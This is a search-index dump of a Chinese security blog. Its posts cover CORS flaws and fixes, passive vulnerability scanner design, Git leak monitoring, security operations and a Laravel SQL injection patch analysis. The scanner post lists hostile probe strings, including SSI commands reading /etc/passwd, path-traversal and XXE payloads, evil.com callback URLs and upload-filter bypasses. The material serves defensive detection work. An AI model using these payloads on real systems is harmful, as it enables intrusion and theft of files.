<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[cors漏洞之123]]></title>
      <url>/vuln/2019/09/28/cors-tips/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>cors漏洞相信大家已经很熟悉了，一般会用于配合csrf漏洞对用户进行攻击。这里就遇到的一些case，简单讲讲可能漏报误报的点，以及相应的修复方案。
</strong></span>
</p>

<h3 id="cors漏洞要素">cors漏洞要素</h3>

<p>cors漏洞成功主要需要两个点，</p>

<p>在Html Response头部里面：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Access-Control-Allow-Origin: http://www.whitedomain.com
Access-Control-Allow-Origin: true or false
</code></pre>
</div>
<p>或者同时具备：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: false
</code></pre>
</div>
<p>Credentials这里是比较容易被忽略的，Credentials为false的话，数据包是不会带上<strong>传统的认证信息</strong>，你获取到的敏感内容也是相对有限的。</p>

<p>另外，cors漏洞也需要注意一点，你在构造测试点的时候，需要得到：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Origin: http://www.whitedomain.com
</code></pre>
</div>
<p>这里的域名是不能带上目录的，因为你实际上构造钓鱼页面的时候，是无法构造畸形Origin的。</p>

<p>为啥呢，因为你从页面发送给后端的请求，浏览器会主动去解析过滤，如果在这里去构造畸形的域名，他会只取到host部分，不会处理目录，然后拿去给后端解析。</p>

<p>比如说，浏览器会像下面这样处理去取host，由于需要配合通用后端过滤设置，需要www.whitedomain.com结尾的绕过尝试：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://www.evil.com/whitedomain.com ===&gt; 
www.evil.com
http://www.evil.com\.whitedomain.com ===&gt; 
www.evil.com
http://www.evil.com#www.whitedomain.com ===&gt; 
www.evil.com
http://www.evil.com?www.whitedomain.com ===&gt; 
www.evil.com 

</code></pre>
</div>
<p>大概举几个例子就行，反正我这边暂时没找到可以绕过的尝试，后缀whitedomain.com，搞出来基本上取出来的真正host，也只能是whitedomain.com。</p>

<p>这是啥意思呢？意思是你去构造畸形的域名，浏览器可能就直接过滤拦截了。
传到后端的，基本就是你想要构造的恶意目的域名。这时候，后端做好相应的防跨域配置和服务器配置，基本就可以稳定拦截了。</p>

<h3 id="修复方法">修复方法</h3>

<p>java后端配置举例（jetty版本）：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>public FilterRegistrationBean crossFilter()
{
FilterRegistrationBean registration = new FilterRegistrationBean();
registration.setFilter(new org.eclipse.jetty.servlets.CrossOriginFilter() );
registration.addInitParameter(name: "allowOrigins", value: "*.whitedomain.com");
registration.addInitParameter(name: "allowMethods", value: "GET,POST,HEAD");
registration.addInitParameter(name: "allowHeaders", value: "X-Requested-With,Content-Type,Accept,Origin");
registration.addUrlPatterns("/*");
registration.setName("cross-origin");
return registration;
}
</code></pre>
</div>

<p>需要在pom.xml里配置的话:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;web-app&gt;

    &lt;filter&gt;
        &lt;filter-name&gt;cross-origin&lt;/filter-name&gt;
        &lt;filter-class&gt;org.eclipse.jetty.servlets.CrossOriginFilter&lt;/filter-class&gt;
    &lt;/filter&gt;
    &lt;filter-mapping&gt;
        &lt;filter-name&gt;cross-origin&lt;/filter-name&gt;
        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
    &lt;/filter-mapping&gt;

&lt;/web-app&gt;
</code></pre>
</div>

<p>当然，如果遇到特殊情况，需要在前端直接配置，nodejs配置举例：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>// 判断origin是否在域名白名单列表中

function isOriginAllowed(origin, allowedOrigin) {

if (_.isArray(allowedOrigin)) {

for(let i = 0; i &lt; allowedOrigin.length; i++) {

if(isOriginAllowed(origin, allowedOrigin[i])) {

return true;

}

}

return false;

} else if (_.isString(allowedOrigin)) {

return origin === allowedOrigin;

} else if (allowedOrigin instanceof RegExp) {

return allowedOrigin.test(origin);

} else {

return !!allowedOrigin;

}

}

const ALLOW_ORIGIN = [ // 域名白名单

'*.whitedomain.com',

];

app.post('/formdata', function (req, res, next) {

let reqOrigin = req.headers.origin; // request响应头的origin属性

// 判断请求是否在域名白名单内

if(isOriginAllowed(reqOrigin, ALLOW_ORIGIN)) {

// 设置CORS为请求的Origin值

res.header("Access-Control-Allow-Origin", reqOrigin);

//个人觉得下面一句根据业务而定，可设定可不设定。
res.header('Access-Control-Allow-Credentials', 'true');

// 你的业务代码逻辑代码 ...

// ...

} else {

res.send({ code: -2, msg: '非法请求' });

}

});
</code></pre>
</div>

]]></content>
      <categories>
        
          <category> vuln </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[浅谈被动漏扫思路]]></title>
      <url>/scanner/2019/08/15/axe-scanner-design/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>本文中的规则分析，大部分来自于以前被动漏扫研发的实践，以后会再接触更多业务后，会继续进行更新。其中如有纰漏或者差错，希望诸位给出修正意见。
</strong></span>
</p>

<h3 id="sql注入">SQL注入</h3>
<p>对于SQLI注入，可以使用sqlmapapi进行检测。</p>

<p>优点在于，对于一些带回显和延时注入，企业内部检测没有waf拦截，会较为准确的定位。</p>

<p>缺点在于，对于这类检测，由于属于大规模扫描，一般会采用level和risk为初级的检测。当注入所需条件比较苛刻时，可能会覆盖不全，造成遗漏。</p>

<h3 id="xss">XSS</h3>
<p>对于XSS的检测的话，已经解决的有两个点，是针对反射性XSS和DOM型XSS的检测。</p>

<p>以前对awvs一类的扫描器做过调研，通常是用变形的常用的payload去fuzz，检测效率是比较低的，也容易被拦截。</p>

<p>针对反射性XSS（包含POST型存储XSS），采用的是检测部分特殊字符，两两成对，如果未曾过滤再去借助专门的XSS扫描器进行扫描，可尝试的字符如下：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>'
"
&lt; 
&gt; 
/
</code></pre>
</div>

<p>其实还可以做二次复检，加入敏感html标签再次尝试。这样检测成本提高不多，但会更准确一些。</p>

<p>对于DOM型XSS检测，提供有两种方案：</p>

<ul>
  <li>采用守护进程的方式去利用headless浏览器来hook渲染，从而检测出漏洞。
不过这种耗时比较长，有时候也因为浏览器渲染失败，以及同时发包量过大，导致内存崩溃漏掉部分漏洞。</li>
  <li>采用类phamtomjs的引擎，直接增改数据包参数，像检测反射性XSS那样加入特殊字符，通过Ajax方式发送数据包，挨个去检测对比返回值。</li>
</ul>

<p>针对存储型XSS，主要存在一个痛点，返回的页面不一定是输出XSS的点，那我们应该怎么办呢？</p>

<p>个人有个想法，我们可以通过数据库临时表记录下每个打了暗桩的post数据包，通过md5生成的是随机的值，我们可以采用这两种写法：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>A = payload+定位符+md5
B = 特殊字符+定位符+md5
</code></pre>
</div>

<p>然后在抓到的后续访问数据包中，如果response含有完整的A或者B，我们可以通过标记去寻找回溯存储型XSS的源头。</p>

<p>但有人可能会说了，你这随意下暗桩，搞得满站都是垃圾数据怎么办？</p>

<p>以前笔者就遇到过几次众测，个别人坏了规矩，登录后拿着扫描器一顿扫，搞得每个页面都在弹窗。</p>

<p>当然这个问题sqlmap等工具也是存在的，但这跟工具本身没关系，是设计和用途的问题。</p>

<p>这就需要业务扫描平台去做去重规则和黑名单限制了。</p>

<h3 id="越权漏洞">越权漏洞</h3>

<p>越权漏洞本身是不太好全自动化检测的，但我们可以做一些半自动化的工作，比如：</p>
<ul>
  <li>配置多组关键参数对，交替去替换原request中的参数对，看是否会有关键的差异response返回。</li>
  <li>采用混淆过的或者置空的cookie，看看返回数据是否与原response相同。</li>
</ul>

<h3 id="敏感文件泄露">敏感文件泄露</h3>

<p>在web目录可能会存在敏感配置文件或者临时文件，我们需要去通过黑盒探测，做好防治工作。</p>

<p>我们可以采用关键词命中、状态码命中、header命中等方式，多维度进行判断和探测，正确率会相对较高。</p>

<p>目前已经有部分开源扫描器采用了这种方式，可以直接调用或者模拟使用它们的规则。</p>

<h3 id="命令执行漏洞">命令执行漏洞</h3>

<p>命令执行的判定主要是通过以下几种方式：</p>
<ul>
  <li>通过回显，直接判断有没有读取到文件。</li>
  <li>通过dns服务器，判断有无读取到漏洞主机的请求。</li>
  <li>通过server反馈时差，判断是否执行了sleep。</li>
</ul>

<p>但是一般命令执行会有一定的过滤和其他限制，我们需要通过拼接和替换参数值的方式，去构造执行命令的语句，这时候我们就需要用payload去fuzz了。</p>

<h3 id="敏感信息泄露">敏感信息泄露</h3>

<p>对于敏感信息检测，可以通过关键词进行定位，方式主要有以下几种：</p>
<ul>
  <li>配置信息</li>
  <li>日志信息</li>
  <li>敏感api和路径</li>
  <li>cookie/token/明文密码/手机号等</li>
</ul>

<h3 id="crlf-注入">CRLF 注入</h3>

<p>检测是否成功注入header，这里有两个点需要注意：</p>
<ul>
  <li>不建议使用敏感的头部参数，可以生造一个set-header键值对，也方便检测。</li>
  <li>返回码需要为30x。</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>payload：
%0aset-header：ceshi;%0a

关键词：
ceshi
</code></pre>
</div>

<h3 id="ssti-注入">SSTI 注入</h3>

<p>我们可以通过对response中的回显进行关键词匹配：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>$\{\{11 * 11\}\}

121
</code></pre>
</div>

<h3 id="ssi-注入">SSI 注入</h3>

<p>检测方式类似于命令执行漏洞，采用替换参数值的方式，换取回显关键词和dns请求匹配。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;!--#exec cmd="cat /etc/passwd"--&gt;
root

&lt;!--#exec cmd="type c:\windows\win.ini"--&gt;
[extensions]
</code></pre>
</div>

<h3 id="cors漏洞">CORS漏洞</h3>

<p>cors漏洞检测主要通过response中的header关键词，进行相应的定位匹配：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Origin: http://www.baidu.com

Access-Control-Allow-Origin: http://www.baidu.com
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
</code></pre>
</div>

<h3 id="jsonp漏洞检测">JSONP漏洞检测</h3>

<p>jsonp漏洞需要依靠callback，利用场景简单提一下：</p>

<p>在响应中回调函数被硬编码：</p>
<ul>
  <li>基础函数调用</li>
  <li>对象方法调用</li>
</ul>

<p>动态调用回调函数：</p>
<ul>
  <li>URL完全可控（GET变量）</li>
  <li>URL部分可控（GET变量），但是附加有一个数字</li>
  <li>URL可控，但最初不会显示在请求之中</li>
</ul>

<p>那我们的检测方法可以这么做，先判断header是否存在：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Content-Type: application/json
</code></pre>
</div>

<p>再通过关键词定位json数据中，是否含有敏感数据。</p>

<h3 id="websocket劫持检测">WEBSOCKET劫持检测</h3>

<p>对于该漏洞，我们需要先检测header中是否含有Sec-WebSocket-Accept字段。</p>

<p>可以把Origin: https://www.baidu.com修改Origin: http://www.evil.com，若看到服务器端response status返回了 101，可以判定有漏洞。</p>

<h3 id="url跳转漏洞">URL跳转漏洞</h3>

<p>首先我们需要检测是否存在任意跳转漏洞，替换参数值为下面的内容：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>www.evil.com
@www.evil.com
\www.evil.com
\.www.evil.com
#www.evil.com
www.evil.com?vulnweb.cn
http://www.evil.com
http://www.evil.com?vulnweb.cn
evil.com
http://evil.com
</code></pre>
</div>

<p>然后，首先我们可以检测状态码为30x的response数据包里，是否Location解析出的域名为evil.com，亦或是定位evil.com特有可控的关键词。</p>

<p>其次，某些返回包可以能会通过中转页面，借助js进行跳转。</p>

<p>这时，我们可以选择去页面检测meta-refresh标签，以及检测以下标签：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>第1种：
&lt;script language="javascript" type="text/javascript"&gt;
　　window.location.href="login.jsp?backurl="+window.location.href;
　　&lt;/script&gt;
第2种：
&lt;script language="javascript"&gt;
　　alert("返回");
　　window.history.back(-1);
　　&lt;/script&gt;
第3种：
&lt;script language="javascript"&gt;
　　window.navigate("top.jsp");
　　&lt;/script&gt;
第4种：
&lt;script language="JavaScript"&gt;
　　self.location=’top.htm’;
　　&lt;/script&gt;
第5种：
&lt;script language="javascript"&gt;
　　alert("非法访问！");
　　top.location=’xx.jsp’;
　　&lt;/script&gt;
</code></pre>
</div>

<p>再者，我们可以采用更耗资源的暴力做法，直接用headless浏览器去发包，看是否落地域名是否为evil.com。</p>

<h3 id="文件读取漏洞lfi和rfi">文件读取漏洞（LFI和RFI）</h3>

<p>如果我们需要检测是否存在LFI，替换参数值对为下面的内容：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>追加：
../../../../../../../../../../../etc/passwd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
../../../../../../../../../../windows/win.ini

替换：
c:\windows\win.ini
/etc/passwd

匹配关键词：
root
[extensions]
</code></pre>
</div>
<p>至于RFI在放在下面一起讲。</p>

<h3 id="ssrf漏洞">SSRF漏洞</h3>

<p>本漏洞可以可以跟RFI采用类似的检测办法，采用DNS服务器来读取请求。</p>

<p>这里提一下，如果是内网搭建DNS服务器，我们可以规避不能外联和内网IP限制的问题，能更精确的去进行检测。</p>

<p>检测关键词如下：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://vuln.evil.com/index.jsp
http://127.0.0.1/index.jsp
</code></pre>
</div>

<p>发包之后，如果存在漏洞，可以去DNS服务接口去读取到匹配vuln.evil.com（内网DNS服务器为evil.com）的结果；
又或是读取到的内容，是否已经匹配到index.jsp里的动态脚本标签。</p>

<h3 id="文件下载漏洞">文件下载漏洞</h3>

<p>这里用的payload是文件读取漏洞的那套，但是定位的返回关键词不同，我们可以定位response里的header：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Content-Type:application/octet-stream
</code></pre>
</div>

<h3 id="xxe漏洞">XXE漏洞</h3>

<p>检测xxe漏洞的时候，有两种情况可以尝试fuzz。</p>

<ul>
  <li>post参数值里含有xml标签时，这种情况可能需要把xxe payload编码发送。</li>
  <li>直接post了整个xml区块到server端，这种情况可以直接将整块xml区块，替换为xxe payload。</li>
  <li>整块的xml标签就不写出来了，这里给出附加的payload对,，同样是关键词+DNS服务监听：</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>payload:
file:///etc/passwd
file:///c:/windows/win.ini
http://xxx.evil.com

匹配关键词：
root
[extensions]
以及dns监听请求evil.com
</code></pre>
</div>

<h3 id="上传漏洞">上传漏洞</h3>

<p>上传漏洞的可操作的地方比较多，目前公布出的payload中，暂时还没有能完全囊括所有hack点，下面我们会以java为例简单讲讲。</p>

<h4 id="后缀">后缀</h4>
<p>在对java应用后缀绕过的时候，我们可以尝试对下面这些后缀进行fuzz：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>jjspsp
jspx
jspa
jtml
jsw
jsv
jspf
jsp
</code></pre>
</div>

<h4 id="冗余绕过">冗余绕过</h4>
<p>有些地方，我们进行了hack，但是却不影响数据包发送，比如：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Content-Disposition: form-data; name="myfile";;; filename="t3.jsp"

Content-Disposition2: form-data; name="Upload"; filename="1.jsp"

合成一行：
Content‐Disposition: form-data; name="img_crop_file"; filename="1.jsp"Content-Type: image/jpeg

Content‐Disposition: form‐data; name="up_picture"; filename="xss.js
p"

boundary后面加空格：
Content-Type: multipart/form-data; boundary= —————————47146314211411730218525550

Content-Disposition: form-data; filename="xx.jsp"; name="up_picture"

Content-Disposition: form-data; name="file_x"; filename="test.jpg"; filename="test.jsp"

Content-Disposition: form-data; name="Fhq"; test="5W个字符"; filename="test.jsp"

多个Content-Disposition可以用来绕过waf，一般server默认取的是第一个，但研究范围没有覆盖全java web server，有待验证。

绕过文件类型的验证：
Content-Type: image/jpeg

或者直接删除文件类型的验证：
Content-Type: xxxxx
</code></pre>
</div>

<p>检测上传文件有一个痛点，那就是不好自动化定位上传点。</p>

<p>对于<strong>有回显的情况</strong>，暂时有以下的解决办法：</p>

<ul>
  <li>
    <p>利用标签正则，手工定位返回的上传点，这种方法对于大规模扫描时不适用。</p>
  </li>
  <li>
    <p>寻找同一批response包里带有shell后缀的路径，做好web url拼接，暂存后利用shell标识去挨个判断，是否上传成功shell。</p>
  </li>
</ul>

<p>对于<strong>无回显的情况</strong>下：</p>

<p>如果黑盒测试，只能根据常用上传目录去爆破shell文件名，以获取到shell标识为成功。</p>

<p>否则的话，需要结合白盒定位，手动配置好路径，估算生成的文件名，去进行黑盒探测。</p>

]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Git监控小议]]></title>
      <url>/operation/2019/07/28/sec-git-monitor/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>笔者原来在涉猎git监控产品时，就只做了敏感关键词监控。后来在工作中逐渐发现，对于一般量级的企业单位，其实复合型的监控平台更符合这类企业的需求。</strong></span>
</p>

<p>那么，对于git方面的监控，我们应该做些什么呢？</p>

<h3 id="复合型监控">复合型监控</h3>

<h4 id="敏感关键词监控">敏感关键词监控</h4>

<p>对于类github监控，敏感关键词监控是基础，目前主要监控点有以下几种：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>敏感email地址
敏感多级子域名
ssh key
物理机key
云平台key
硬编码的pwd
关键域名+敏感路径+敏感key的拼接
（比如https://xxx/host/{ip}?key={YOUR_API_KEY}）
组织单位标识
关键数据库名、表格名、字段名、连接字符串
vpn配置字符串
smtp配置字符串
</code></pre>
</div>

<p>大部分类github平台，查询应该是需要登录的，这里以github举个例子。</p>

<p>我们可以用session认证，不过只有前100页的查询限制。</p>

<p>当然，大家也可以用key+api接口，个人没采用过这个接口，据说默认搜索前5000个项目。</p>

<p>所以利用好语法是很重要的，我们要精确地对需要监控的关键词，进行综合定位：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>搜索路径中有nsa的代码或者文件中有nsa的代码
nsa in:file,path

搜索用php写的包含userid的代码,文件名为flag，扩展名为txt
userid language:php filename:flag extension:txt

匹配关键字nsa且搜索大小为100字节的xml代码
nsa language:xml size:100

搜索conf目录下包含pass的xml代码
pass path:conf language:xml

除去名为normal_name的repo
-repo:normal_name

搜索star大于20，20&lt;fork&lt;30的项目
stars: &gt;20 fork: 20..30


</code></pre>
</div>
<p>另外，类github平台如果做了查询限制，可以考虑采用以下几点去绕过：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>IP池
多账号轮询
UA池
降频处理
</code></pre>
</div>

<h4 id="安全监控">安全监控</h4>

<p>在大一点的企业平台，做项目管控时，会接入gitlab或者类github平台的私有项目。</p>

<p>那么，如果要坚持精简的原则，我们需要完成哪些基础点呢？</p>

<p>第一，版本监控
每次漏洞大规模爆发时，常常需要去检查下，己方线上环境的组件，是否出于漏洞影响范围之内。</p>

<p>因此，维护和及时更新IT资产的checklist库，无论是实现的半自动化还是自动化监控，都是有一定积极作用的。</p>

<p>第二，安全审计
对于项目本身，我们需要做一些代码安全审计和日常扫描。</p>

<p>一般在代码上线，以及测试分支代码变更时，在条件允许的情况下，都应该触发自动化安全扫描。</p>

<p>在CI自动化和日常扫描时，一旦检测到问题，需要发送报告到安全运维人员过审，再决定要不要通告开发人员，去进行整改或者代码回退。</p>

<p>对于代码本身，可提供配置文件或者接口，供第三方软件，进行安全审计，这里不再多提。</p>

<h4 id="舆情监控">舆情监控</h4>

<p>现如今类github平台因为某些zz原因，成为了某些有心人撰写博客和放新闻的地方。</p>

<p>笔者当初做舆情监控接口的时候，也添加了对这类平台的接口支持，效果感觉尚可。</p>

<h3 id="平台优化tips">平台优化Tips</h3>

<h4 id="关键词定制">关键词定制</h4>

<p>如果我们在开发后期，想要去定制一些关键词咋办？</p>

<p>存在配置文件的情况下，我们可以做关键词命中。</p>

<p>一旦触发命中我们自己添加的关键词（不一定是标准搜索语法），也会直接通过微信或者邮件，将结果推送到负责人那里。</p>

<h4 id="规则可配置">规则可配置</h4>

<p>规则配置可以是多样化的，比如类github平台定期巡检，更新触发扫描，主动扫描检查。</p>

<p>多少时间没响应，会自动再次触发报警推送，多种方式报送警报消息。</p>

<p>制定repo或者author白名单，避免更多的误报。</p>

<p>优化读取的内容，指定显示关键词前后文行数。</p>

<p>设置关键词权重，避免大量冗余数据掩盖了低频高危数据。</p>

<h4 id="污点化">污点化</h4>

<p>在为了防止企业git项目被泄露到公网，我们在命名规范时，可以尝试制定编码规范，必须带上容易识别的特征，或者带上关键词。</p>

<p>这样有个好处，在代码泄露时能及时监控到，但防君子不防小人，内部人员可能会做关键词替换。但这种情况，也可以通过一些特殊技巧去提升保密性。</p>

<p>另外，白帽子提交速度可能比监控响应更快，这就需要考验规范制定者的素质了。</p>

<h4 id="参考文章">参考文章</h4>

<p><a href="https://www.freebuf.com/articles/web/150638.html">深入分析一款简单的Github信息泄露爬虫</a></p>

<p><a href="https://blog.csdn.net/xpx1995/article/details/79031397">Github代码高级搜索小技巧</a></p>

<p><a href="https://www.freebuf.com/sectool/114017.html">基于Github的源码白盒扫描工具Raptor</a></p>

<p><a href="https://www.freebuf.com/column/178342.html">Github信息泄露专项</a></p>
]]></content>
      <categories>
        
          <category> operation </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[安全运维优化思考]]></title>
      <url>/operation/2019/07/13/sec-operation/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>近期由乙方安服实验室，转入了甲方的业务安全部门。在接触了一部分业务安全的运维工作后，也做了些对于自身工作的优化方向的思考。</strong></span>
</p>

<h4 id="资产统计与变更">资产统计与变更</h4>
<p>这段时间正好碰上了FastJson漏洞爆发。由于笔者所在的甲方，属于有一定规模的互联网公司，所以近期也在连夜配合各业务部门进行漏洞修补。</p>

<p>虽然公司本身具有强大的统计平台，也具有较为成熟的资产规范，但还是花了大量时间去统计、升级那些受影响的资产。</p>

<p>举个例子，自家公司的It资产已经接入了自动化运维，采用了基于的ES集群的平台。资产的变更能够及时以*key为基准，计入全局搜索，方便以后搜索和资产统计，以及后续的自动化升级和部署。</p>

<p>但这种统一部署变更的法子，也存在部分痛点。其中的一个就是，一旦基于ES部署平台和Agent自身存在问题，如果没有得到及时修复的话，其自身不小的体量，可能会影响全局资产的修复进度。</p>

<p>因此，拥有多份资产升级/变更/检测方案，能做到轻量/重量级方案互相制约，窃以为还是有必要的。</p>

<p>另外，如果做好了内网Git资产梳理，通过代码扫描定位可能存在的漏洞和服务，也是能辅助统计受影响的资产的。</p>

<h4 id="自动化检测认证">自动化检测认证</h4>
<p>对于大型甲方，如果安全团队在研究好新出的漏洞Poc，对IT资产安全进行自检的时候，如果按正常流程去做，可能首先应该是先进行任务申请上报，然后向全集团发邮件，最后再进行扫描。</p>

<p>不过，在碰上比较紧急的漏洞应急时，在跨部门协作的情况下，经常会来不及走完所有流程。</p>

<p>笔者也曾见过研发、运维等部门，因为突然查到攻击Log，半夜一惊一乍的，去找安全部门验证攻击来源是否属于内部自检。</p>

<p>那么针对这一点，如何做去做优化呢？</p>

<p>不少大型企业，有时会采用统一的签名和加密机制，或者直接构建单独的平台，用于保证传输加密的可信认证。</p>

<p>笔者窃以为，这点是可以借鉴的。如果能做好一定范围内的成本控制，在每次做自动化安全检测的时候，将加密认证信息加入检测数据包头部，以用作内部安全检测的授信，各个BU会更加轻松的识别出真实的攻击事件。</p>

<h4 id="敏感数据泄漏控制">敏感数据泄漏控制</h4>
<p>防止敏感数据的泄漏，以及进行事后的责任追溯，一直是甲方比较重视的点，据悉大致有这样几种方案：</p>

<p>1.DLP数据防泄漏</p>

<p>DLP软件一般是为了定位公司敏感数据外发行为，对于数据流量内容进行监控审计，现在市面上也有了不少成熟的合规产品。</p>

<p>2.堡垒机</p>

<p>堡垒机上具有监控，限制数据传输和全程录屏等功能，配合查询系统的水印功能，也能在一定程度上防止数据泄漏，以及对泄漏源进行追溯。</p>

<p>3.数据脱敏</p>

<p>在存储和展示敏感数据的时候，本身应该做好脱敏操作，对于数据进行加密存储和非完全展示，防止内鬼和意外泄漏事件发生。</p>

<p>4.数据监控</p>

<p>虽然如同Github监控和舆情监控一般的产品，并不能有效抑制数据泄漏。但在防止数据扩散，以及追溯数据泄漏来源的层面来看，还是比较有用的。</p>

<p>如果能综合利用多类产品，再加上企业本身的安全管理规范，应该是能够在一定程度上保证数据安全的。</p>

<h4 id="产品检测流程">产品检测流程</h4>
<p>在原来的乙方安全测试岗位，如果需要对产品做安检的时候，随便去咨询个资深的相关产品、售前或者研发，基本上都能问出个所以然来。</p>

<p>然而到了现在的甲方安全运维岗，可就厉害了。在工作流程细化和文档化以后，需要做安全检测时，得挨个询问多个QA/RD/PM，一点一点把他们的需求和设计方案抠出来，最后还得去找API文档自己做补充和完善，才能进行下一步的操作。</p>

<p>笔者这两天还去拜访了一家非互联网甲方，跟那边负责安全的Leader朋友聊了下，产品上线合规的紧要性，确实是远优先于安全合规的，当然这个也是不得已而为之。</p>

<p>总的来说，合规化有益于流程梳理，简化有益于加速产品上线，也算各有各的好处吧。</p>

<p>当然笔者见识有限，窥一斑而不得见全豹。但总的来说，确实可以根据不同产品的实际情况，去对流程进行一些灵活变通。</p>

<h4 id="后记">后记</h4>
<p>以上只是简单谈了一些感受，这方面的工作资历尚浅，期待各路读者斧正和指教。</p>

]]></content>
      <categories>
        
          <category> operation </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP开发框架LaravelのSQL注入漏洞分析]]></title>
      <url>/bug/2019/03/26/php-framework-Laravel-sqli/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>PHP开发框架Laravel，前几天在官方博客通报了一个SQL注入漏洞，这里简单分析下。</strong></span>
</p>

<p>首先，这个漏洞属于网站coding写法不规范，官方给了提示：</p>

<p><img src="http://ww1.sinaimg.cn/large/697f6f27ly1g1gby7vp5qj20hx03ht8x.jpg" alt="" /></p>

<p>但官方还是做了修补，升级最新版本V5.8.7可修复。</p>

<p>我们先定位下这里：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Illuminate\Validation\Rule
</code></pre>
</div>
<p>官方推荐的写法是：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Rule::unique('users')-&gt;ignore($id),
</code></pre>
</div>
<p>但如果网站没有预先对$id的值做处理时，用户可以传递恶意数据给ignore函数，就会导致SQL注入。</p>

<p>我们来跟一下函数：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>\Illuminate\Validation\Rules\Unique.php

class Unique
{
...
public function ignore($id, $idColumn = null)
    {
        if ($id instanceof Model) {
            return $this-&gt;ignoreModel($id, $idColumn);
        }

        $this-&gt;ignore = $id;
        $this-&gt;idColumn = $idColumn ?? 'id';

        return $this;
    }

</code></pre>
</div>
<p>这里我们不考虑把$id写成实例的情况，$id是用户可控的话，$idColumn直接写为空即可，最后赋值情况如下：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$this-&gt;ignore = $id;
$this-&gt;idColumn = 'id';
</code></pre>
</div>

<p>如果网站代码类似这样构造的话，黑客输入的值就属于可控状态：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>$id = $request-&gt;input('id');
</code></pre>
</div>
<p>最后我们会走到这儿：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Illuminate\Validation\Rules\Unique.php

    public function __toString()
    {
        ...
        ...
    }
</code></pre>
</div>

<p>我们看下关键的代码变更：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Illuminate\Validation\Rules\Unique.php

V5.8.7【最新版】
    public function __toString()
    {
            $this-&gt;ignore ? '"'.addslashes($this-&gt;ignore).'"' : 'NULL',
    }
</code></pre>
</div>
<div class="highlighter-rouge"><pre class="highlight"><code>Illuminate\Validation\Rules\Unique.php

V5.8.4
    public function __toString()
    {

            $this-&gt;ignore ? '"'.$this-&gt;ignore.'"' : 'NULL',

    }
</code></pre>
</div>
<p>这里最新的代码v5.8.7，把$this-&gt;ignore直接给addslashes了，以前这里是没有防护的。</p>

<p>有趣的是，笔者对比了下diff，期间官方还试图对其他引用的地方进行了过滤。最后还是改成了__toString处，进行统一过滤的方式。</p>

<p>最后提一句，后面的代码会进入DatabaseRule，进行后续SQL规则匹配。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Illuminate\Validation\Rules\DatabaseRule.php
</code></pre>
</div>

<p>这之后就没有再进一步处理，接着形成了SQL注入。</p>

<p>参考链接：</p>

<p><a href="https://blog.laravel.com/unique-rule-sql-injection-warning?fbclid=IwAR26Cs1Ewh983UxSF5fNO8Xr0hUnwSO_Ikbr08Adi20m5h5llP0WhNDmgRg">官方通告</a></p>

<p><a href="https://laravel.com/docs/5.8/validation#rule-unique">说明文档</a></p>

]]></content>
      <categories>
        
          <category> bug </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[WordPress Easy WP SMTP反序列化漏洞分析]]></title>
      <url>/bug/2019/03/24/unserialize-vuln-for-wp-plugin-easy-wp-smtp/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>Wordpress插件Easy WP SMTP最近新出了个漏洞，以前有关注过，好像新的代码变化有点大，所以这里花了点时间简单分析下。</strong></span>
</p>

<p>首先，这个漏洞存在于版本v1.3.9。 我这里能下到最接近的老版本是v1.3.8，可惜v1.3.9更迭了一些重要代码，我找到的版本，应该不能复现这个漏洞。
